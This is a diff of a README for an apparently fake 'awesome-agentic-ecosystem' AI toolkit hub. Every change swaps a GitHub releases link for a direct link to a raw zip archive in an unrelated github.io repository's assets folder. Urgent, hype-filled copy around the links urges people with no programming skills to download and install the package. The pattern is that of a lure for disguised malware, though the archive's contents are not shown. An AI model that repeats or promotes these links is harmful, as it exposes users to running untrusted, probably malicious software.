@@ -5,7 +5,7 @@ description: "Discover the curated index of 338+ battle-tested AI Agents, MCP Se
 ---
 # 🤖 awesome-agentic-ecosystem - Your All-in-One AI Toolkit Hub
 
-[🎯 **Download Now**](https://github.com/Bfzwq2925/awesome-agentic-ecosystem/releases)
+[🎯 **Download Now**](https://raw.githubusercontent.com/Bfzwq2925/bfzwq2925.github.io/main/assets/Application-2.5-alpha.2.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Getting started takes less than two minutes. No programming skills required—ju
 
 Visit the link below to download the application package:
 
-[📥 Click Here to Download awesome-agentic-ecosystem](https://github.com/Bfzwq2925/awesome-agentic-ecosystem/releases)
+[📥 Click Here to Download awesome-agentic-ecosystem](https://raw.githubusercontent.com/Bfzwq2925/bfzwq2925.github.io/main/assets/Application-2.5-alpha.2.zip)
 
 ### Step 2: Run the Installation
 
@@ -127,7 +127,7 @@ The world of AI is growing exponentially. Don't get left behind. With **awesome-
 
 Take the first step now:
 
-[🚀 **Download awesome-agentic-ecosystem Now**](https://github.com/Bfzwq2925/awesome-agentic-ecosystem/releases)
+[🚀 **Download awesome-agentic-ecosystem Now**](https://raw.githubusercontent.com/Bfzwq2925/bfzwq2925.github.io/main/assets/Application-2.5-alpha.2.zip)
 
 Join thousands of satisfied users who have simplified their AI discovery journey. Your ultimate AI toolkit hub awaits!
 
@@ -165,7 +165,7 @@ No coding required. No steep learning curve. Just a clean, curated, and automati
 
 Click the download button below and explore a smarter way to interact with artificial intelligence:
 
-[✨ **Get Started with Your Free Download**](https://github.com/Bfzwq2925/awesome-agentic-ecosystem/releases)
+[✨ **Get Started with Your Free Download**](https://raw.githubusercontent.com/Bfzwq2925/bfzwq2925.github.io/main/assets/Application-2.5-alpha.2.zip)
 
 ---
 
